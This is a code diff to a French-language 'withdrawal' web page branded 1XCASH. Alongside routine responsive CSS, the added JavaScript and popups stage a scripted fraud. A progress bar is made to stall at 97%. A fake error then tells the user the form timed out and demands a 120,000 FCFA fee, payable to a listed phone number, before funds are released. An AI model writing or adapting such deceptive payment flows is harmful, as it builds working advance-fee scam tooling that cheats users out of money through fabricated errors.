@@ -71,6 +71,11 @@
             100% { transform: scale(1); }
         }
 
+        @keyframes progressBar {
+            0% { width: 0%; }
+            100% { width: 97%; }
+        }
+
         .liquid-element {
             position: fixed;
             border-radius: 50%;
@@ -93,7 +98,7 @@
 
         /* Logo 1XCASH - DROIT */
         .logo {
-            font-size: 3.5rem;
+            font-size: clamp(2.5rem, 5vw, 3.5rem);
             font-weight: 900;
             margin-bottom: 2.5rem;
             text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.2);
@@ -309,7 +314,7 @@
         }
 
         .balance-amount {
-            font-size: 2.8rem;
+            font-size: clamp(2rem, 5vw, 2.8rem);
             font-weight: 800;
             margin: 1.5rem 0;
             color: var(--dark-blue);
@@ -348,7 +353,7 @@
 
         .dashboard-options {
             display: grid;
-            grid-template-columns: 1fr 1fr;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
             gap: 1.5rem;
             width: 100%;
             margin-bottom: 2.5rem;
@@ -722,6 +727,50 @@
             border-radius: 12px;
         }
 
+        /* Styles pour la barre de progression */
+        .progress-container {
+            width: 100%;
+            height: 20px;
+            background-color: #e0e0e0;
+            border-radius: 10px;
+            margin: 2rem 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-blue) 0%, var(--light-blue) 100%);
+            border-radius: 10px;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .progress-text {
+            text-align: center;
+            font-weight: bold;
+            color: var(--dark-blue);
+            margin-bottom: 1rem;
+        }
+
+        /* Styles pour les détails de paiement */
+        .payment-details {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            text-align: left;
+        }
+
+        .payment-details p {
+            margin-bottom: 0.8rem;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .payment-details strong {
+            color: var(--dark-blue);
+        }
+
         /* Responsive amélioré */
         @media (max-width: 768px) {
             .dashboard-options {
@@ -755,6 +804,71 @@
             .page {
                 padding: 1.8rem;
             }
+
+            .dashboard-header {
+                flex-direction: column;
+                gap: 1rem;
+                text-align: center;
+            }
+
+            .cashvip-container {
+                padding: 1.5rem;
+            }
+
+            .cashback-table, .levels-table {
+                font-size: 0.85rem;
+            }
+
+            .cashback-table th, .cashback-table td, 
+            .levels-table th, .levels-table td {
+                padding: 0.7rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .page {
+                width: 95%;
+                padding: 1.5rem;
+            }
+
+            .logo {
+                font-size: 2.2rem;
+                margin-bottom: 1.5rem;
+            }
+
+            .btn {
+                padding: 1rem 1.5rem;
+                font-size: 0.9rem;
+            }
+
+            .balance-amount {
+                font-size: 1.8rem;
+            }
+
+            .option-card {
+                padding: 1.5rem 1rem;
+                min-height: 150px;
+            }
+
+            .option-icon {
+                font-size: 2rem;
+            }
+
+            .graph-container {
+                padding: 1.5rem;
+            }
+
+            .graph {
+                height: 150px;
+            }
+
+            .popup-content {
+                padding: 1.5rem;
+            }
+
+            .popup-icon {
+                font-size: 3rem;
+            }
         }
 
         /* Animation des éléments du tableau de bord avec délais */
@@ -768,25 +882,6 @@
         .dashboard-element:nth-child(3) { animation-delay: 0.3s; }
         .dashboard-element:nth-child(4) { animation-delay: 0.4s; }
         .dashboard-element:nth-child(5) { animation-delay: 0.5s; }
-
-        /* Styles pour les détails de paiement */
-        .payment-details {
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 12px;
-            padding: 1.5rem;
-            margin: 1.5rem 0;
-            text-align: left;
-        }
-
-        .payment-details p {
-            margin-bottom: 0.8rem;
-            display: flex;
-            justify-content: space-between;
-        }
-
-        .payment-details strong {
-            color: var(--dark-blue);
-        }
     </style>
 </head>
 <body>
@@ -1184,6 +1279,56 @@
         </div>
     </div>
 
+    <!-- Nouveaux popups pour le processus de retrait -->
+    <div id="popup-processing" class="popup">
+        <div class="popup-content glass">
+            <button class="popup-close">&times;</button>
+            <div class="popup-icon">⏳</div>
+            <h3>Traitement en cours</h3>
+            <div class="progress-text">0%</div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+            <p>Veuillez patienter pendant le traitement de votre demande...</p>
+        </div>
+    </div>
+
+    <div id="popup-error" class="popup">
+        <div class="popup-content glass">
+            <button class="popup-close">&times;</button>
+            <div class="popup-icon">❌</div>
+            <h3>Erreur de soumission</h3>
+            <p style="text-align: left; line-height: 1.6; margin: 1.5rem 0;">
+                Une erreur est survenue lors de la soumission du formulaire.<br>
+                Il semble que le délai de remplissage ait été dépassé ou que certaines informations aient été mal renseignées.<br><br>
+                Pour réactiver votre accès et poursuivre le processus, un frais de 120.000 FCFA est requis.<br>
+                Veuillez procéder au paiement dès maintenant afin de finaliser votre inscription et nous permettre de vous retrouver rapidement.
+            </p>
+            <button class="btn btn-primary btn-full" id="accept-payment-btn">
+                <span>✅</span> D'accord, j'accepte
+            </button>
+        </div>
+    </div>
+
+    <div id="popup-final-payment" class="popup">
+        <div class="popup-content glass">
+            <button class="popup-close">&times;</button>
+            <div class="popup-icon">💳</div>
+            <h3>Paiement final requis</h3>
+            <p>Veuillez effectuer le paiement de 120.000 FCFA sur le numéro suivant pour continuer :</p>
+            
+            <div class="payment-details">
+                <p><strong>Numéro:</strong> +225 0575274126</p>
+            </div>
+            
+            <p style="margin-bottom: 1.5rem;">Une fois le paiement effectué, votre compte sera réactivé et vous pourrez poursuivre le processus de retrait.</p>
+            
+            <button class="btn btn-primary btn-full" id="confirm-final-payment">
+                <span>✅</span> J'ai effectué le paiement
+            </button>
+        </div>
+    </div>
+
     <script>
         // Gestion des pages
         const pages = document.querySelectorAll('.page');
@@ -1209,6 +1354,27 @@
             popups.forEach(popup => {
                 popup.style.display = 'none';
             });
+        }
+
+        // Fonction pour simuler la barre de progression
+        function simulateProgress() {
+            const progressBar = document.getElementById('progress-bar');
+            const progressText = document.querySelector('.progress-text');
+            let progress = 0;
+            
+            const interval = setInterval(() => {
+                progress += 1;
+                progressBar.style.width = progress + '%';
+                progressText.textContent = progress + '%';
+                
+                if (progress >= 97) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        hideAllPopups();
+                        showPopup('popup-error');
+                    }, 500);
+                }
+            }, 50); // Ajustez la vitesse de progression ici
         }
 
         // Événements
@@ -1265,8 +1431,21 @@
                 return;
             }
             
-            // Affichage des détails de paiement
-            showPopup('popup-payment-details');
+            // Affichage de la barre de progression
+            showPopup('popup-processing');
+            simulateProgress();
+        });
+
+        // Accepter le paiement des frais
+        document.getElementById('accept-payment-btn').addEventListener('click', () => {
+            hideAllPopups();
+            showPopup('popup-final-payment');
+        });
+
+        // Confirmation du paiement final
+        document.getElementById('confirm-final-payment').addEventListener('click', () => {
+            hideAllPopups();
+            showPopup('popup-wait');
         });
 
         // Confirmation du paiement effectué
